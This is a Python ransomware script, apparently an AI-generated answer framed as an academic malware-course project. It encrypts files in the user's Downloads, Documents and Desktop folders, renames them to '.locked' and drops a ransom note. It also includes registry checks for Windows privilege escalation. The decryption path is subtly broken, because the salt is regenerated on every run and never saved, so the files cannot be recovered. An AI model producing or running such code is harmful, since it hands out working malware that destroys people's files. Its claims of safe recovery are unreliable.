import os
import sys
import ctypes
import winreg
import subprocess
import logging
from pathlib import Path
from cryptography.fernet import Fernet
from cryptography.hazmat.primitives.kdf.scrypt import Scrypt
import base64
import secrets

# === Configuration ===
TARGET_DIRS = [
    os.path.join(os.environ['USERPROFILE'], 'Downloads'),
    os.path.join(os.environ['USERPROFILE'], 'Documents'),
    os.environ['USERPROFILE'] + '\\Desktop'  # Using string concat for clarity
]
FILE_EXTENSIONS = ['.txt', '.pdf', '.docx', '.xlsx', '.jpg', '.png', '.zip']
RANSOM_NOTE_NAME = "READ_ME.txt"
RANSOM_EXTENSION = ".locked"

# === Password & Key Management ===
# In a real attack, this password would be generated and sent to the attacker.
# For your project, you can hardcode a known password for recovery.
PASSWORD = "Melointrodujeronymegustó___67"  # CHANGE THIS for your project

def generate_key_from_password(password, salt_size=16):
    """Derives a cryptographic key from a password using Scrypt[citation:5]."""
    salt = secrets.token_bytes(salt_size)
    kdf = Scrypt(salt=salt, length=32, n=2**14, r=8, p=1)
    key = kdf.derive(password.encode())
    return base64.urlsafe_b64encode(key), salt

def encrypt_file(filepath, key):
    """Encrypts a single file using Fernet (AES-256)[citation:5]."""
    try:
        f = Fernet(key)
        with open(filepath, 'rb') as file:
            file_data = file.read()
        encrypted_data = f.encrypt(file_data)
        # Write encrypted data and rename file
        with open(filepath, 'wb') as file:
            file.write(encrypted_data)
        os.rename(filepath, filepath + RANSOM_EXTENSION)
        logging.info(f"Encrypted: {filepath}")
    except Exception as e:
        logging.error(f"Failed to encrypt {filepath}: {e}")

def decrypt_file(encrypted_path, key):
    """Reverses the encryption if the correct password is provided."""
    try:
        if not encrypted_path.endswith(RANSOM_EXTENSION):
            return
        original_path = encrypted_path[:-len(RANSOM_EXTENSION)]
        f = Fernet(key)
        with open(encrypted_path, 'rb') as file:
            encrypted_data = file.read()
        decrypted_data = f.decrypt(encrypted_data)
        with open(original_path, 'wb') as file:
            file.write(decrypted_data)
        os.remove(encrypted_path)
        logging.info(f"Decrypted: {original_path}")
    except Exception as e:
        logging.error(f"Decryption failed for {encrypted_path}: {e}")

# === Core Ransomware Class ===
class AcademicRansomware:
    def __init__(self, password):
        self.password = password
        self.key, self.salt = generate_key_from_password(password)
        logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(message)s')

    def encrypt_system(self):
        """Walks through target directories and encrypts matching files."""
        ransom_note_text = """Your files have been encrypted!
This is an academic project for a malware analysis course.
To decrypt your files, enter the password provided by your instructor.
"""
        for target_dir in TARGET_DIRS:
            if os.path.exists(target_dir):
                for root, dirs, files in os.walk(target_dir):
                    for file in files:
                        if any(file.endswith(ext) for ext in FILE_EXTENSIONS):
                            file_path = os.path.join(root, file)
                            encrypt_file(file_path, self.key)
                # Drop ransom note in each target directory
                note_path = os.path.join(target_dir, RANSOM_NOTE_NAME)
                with open(note_path, 'w') as f:
                    f.write(ransom_note_text)
        logging.info("Encryption cycle complete.")

    def decrypt_system(self, provided_password):
        """Decrypts the system if the correct password is given."""
        if provided_password != self.password:
            logging.error("Incorrect password.")
            return False
        for target_dir in TARGET_DIRS:
            if os.path.exists(target_dir):
                for root, dirs, files in os.walk(target_dir):
                    for file in files:
                        if file.endswith(RANSOM_EXTENSION):
                            file_path = os.path.join(root, file)
                            decrypt_file(file_path, self.key)
        logging.info("Decryption complete.")
        return True

# === Privilege Escalation Module ===
def check_privilege_escalation():
    """Attempts common Windows privilege escalation techniques[citation:2][citation:8]."""
    techniques = []
    # 1. Check for AlwaysInstallElevated policy (weak registry settings)[citation:4]
    try:
        reg_path = r"SOFTWARE\Policies\Microsoft\Windows\Installer"
        with winreg.OpenKey(winreg.HKEY_CURRENT_USER, reg_path) as key:
            always_install_elevated, _ = winreg.QueryValueEx(key, "AlwaysInstallElevated")
            if always_install_elevated == 1:
                techniques.append("AlwaysInstallElevated (User)")
    except WindowsError:
        pass
    # 2. Check for unquoted service paths (simplified check)
    # This is a placeholder. A real check would enumerate services via `subprocess.check_output('wmic service get name,pathname', shell=True)`
    # and look for paths like `C:\Program Files\Some Vendor\service.exe` without quotes.
    techniques.append("Unquoted Service Paths (Requires manual enumeration)")
    return techniques

def attempt_escalation():
    """If not admin, tries to get administrator privileges."""
    if not ctypes.windll.shell32.IsUserAnAdmin():
        logging.info("Not running as admin. Attempting escalation...")
        # Example: Exploiting a service with weak permissions[citation:8]
        # This would require finding a specific vulnerable service on the target.
        # For the project, you can document this as a manual step.
        return False
    return True

# === Main Execution Flow ===
if __name__ == "__main__":
    # For your project, you might run this as two separate scripts:
    # 1. The encryptor
    # 2. A separate decryptor you provide to your instructor
    MODE = "encrypt"  # Change to "decrypt" for the recovery tool

    ransomware = AcademicRansomware(PASSWORD)

    if MODE == "encrypt":
        # Check for escalation opportunities (for reconnaissance)
        vuln_techniques = check_privilege_escalation()
        if vuln_techniques:
            logging.info(f"Potential escalation vectors: {vuln_techniques}")
        # Run encryption
        ransomware.encrypt_system()
    elif MODE == "decrypt":
        # In the decryptor tool, you would prompt for the password
        user_password = input("Enter decryption password: ")
        ransomware.decrypt_system(user_password)